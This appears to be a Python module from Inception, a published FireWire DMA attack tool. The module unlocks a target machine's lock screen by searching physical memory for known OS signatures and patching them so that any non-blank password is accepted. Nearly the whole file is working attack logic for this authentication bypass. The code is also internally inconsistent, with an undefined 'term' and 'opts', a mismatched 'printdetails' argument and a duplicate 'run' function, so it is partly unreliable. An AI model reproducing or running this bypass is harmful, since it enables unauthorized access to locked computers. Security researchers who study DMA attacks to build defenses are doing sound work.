'''
Inception - a FireWire physical memory manipulation and hacking tool exploiting
IEEE 1394 SBP-2 DMA.

Copyright (C) 2011-2013  Carsten Maartmann-Moe

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

Created on Jun 23, 2011

@author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy
'''
from inception import firewire, cfg, sound, util
import os
import sys
import time

info = 'Unlocks the target\'s screensaver or lock screen. After running ' \
'this module you should be able to log in with any non-blank password.'

def add_options(parser):
    pass


def select_target(targets, selected=False):
    '''
    Provides easy selection of targets. Input is a list of targets (dicts)
    '''
    if len(targets) == 1:
        term.info('Only one target present, auto-selected')
        return targets[0]
    if not selected:
        selected = term.poll('Please select target (or enter \'q\' to quit):')
    nof_targets = len(targets)
    try:
        selected = int(selected)
    except:
        if selected == 'q': sys.exit()
        else:
            term.warn('Invalid selection, please try again. Type \'q\' to quit')
            return select_target(targets)
    if 0 < selected <= nof_targets:
        return targets[selected - 1]
    else:
        term.warn('Please enter a selection between 1 and ' + str(nof_targets) + 
                  '. Type \'q\' to quit')
        return select_target(targets)
    

def printdetails(opts): # TODO: Fix this fugly method
    '''
    Prints details about a target
    '''
    term.info('The target module contains the following signatures:')
    term.separator()
    print('\tVersions:\t' + ', '.join(target['versions']).rstrip(', '))
    print('\tArchitectures:\t' + ', '
          .join(target['architectures']).rstrip(', '))
    for signature in target['signatures']:
        offsets = '\n\t\tOffsets:\t'
        for offset in signature['offsets']:
            offsets += hex(offset)
            if not offset is signature['offsets'][-1]: offsets += ', '
        print(offsets)
        sig = '\t\tSignature:\t0x'
        ioffs = 0
        patch = 0
        poffs = 0
        for chunk in signature['chunks']:
            diff = chunk['internaloffset'] - util.bytelen(chunk['chunk']) - 1 - ioffs
            sig += '__' * diff
            ioffs = chunk['internaloffset']
            sig += '{0:x}'.format(chunk['chunk'])
            try:
                patch = chunk['patch']
                poffs = chunk['patchoffset']
            except KeyError: pass
        print(sig)
        print('\t\tPatch:\t\t{0:#x}'.format(patch))
        print('\t\tPatch offset:\t{0:#x}'.format(poffs))
        
    term.separator()
    
    
def list_targets(targets, details=False):
    term.info('Available targets (known signatures):')
    term.separator()
    for number, target in enumerate(targets, 1):
                term.info(target['OS'] + ': ' + target['name'], sign = number)
                if details:
                    printdetails(target)
    if not details: # Avoid duplicate separator
        term.separator()


def run(targets):
    '''
    Main attack logic
    '''
    # Initialize
    if not cfg.filemode:
        try:
            fw = firewire.FireWire()
        except IOError:
            term.fail('Could not initialize FireWire. Are the modules ' +
                      'loaded into the kernel?')
        start = time.time()
        device_index = fw.select_device()

    # List targets
    list_targets(targets)
       
    # Select target
    target = select_target(targets)
    
    # Print selection. If verbose, print selection with signatures
    term.info('Selected target: ' + target['OS'] + ': ' + target['name'])
    if opts.verbose:
        printdetails(target)
    
    # Lower DMA shield or use a file as input, and set memsize
    device = None
    memsize = None
    if cfg.filemode:
        device = util.MemoryFile(opts.filename, cfg.PAGESIZE)
        memsize = os.path.getsize(opts.filename)
    else:
        elapsed = int(time.time() - start)
        device = fw.getdevice(device_index, elapsed)
        memsize = cfg.memsize
    
    # Perform parallel search for all signatures for each OS at the known 
    # offsets
    term.info('DMA shields should be down by now. Attacking...')
    address, chunks = searchanddestroy(device, target, memsize)
    if not address:
        # TODO: Fall-back sequential search?
        return None, None
    
    # Signature found, let's patch
    mask = 0xfffff000 # Mask away the lower bits to find the page number
    page = int((address & mask) / cfg.PAGESIZE)
    term.info('Signature found at {0:#x} in page no. {1}'.format(address, page))
    if not cfg.dry_run:
        success, backup = patch(device, address, chunks)
        if success:
            if cfg.egg:
                sound.play('resources/inception.wav')
            term.info('Patch verified; successful')
            term.info('BRRRRRRRAAAAAWWWWRWRRRMRMRMMRMRMMMMM!!!')
        else:
            term.warn('Write-back could not be verified; patching *may* ' +
                      'have been unsuccessful')

        if cfg.revert:
            term.poll('Press [enter] to revert the patch:')
            device.write(address, backup)

            if backup == device.read(address, cfg.PAGESIZE):
                term.info('Revert patch verified; successful')
            else:
                term.warn('Revert patch could not be verified')

    #Clean up
    device.close()
    
    return address, page


def run(opts):
    fw = firewire.FireWire(opts.delay)
    fw.businfo()


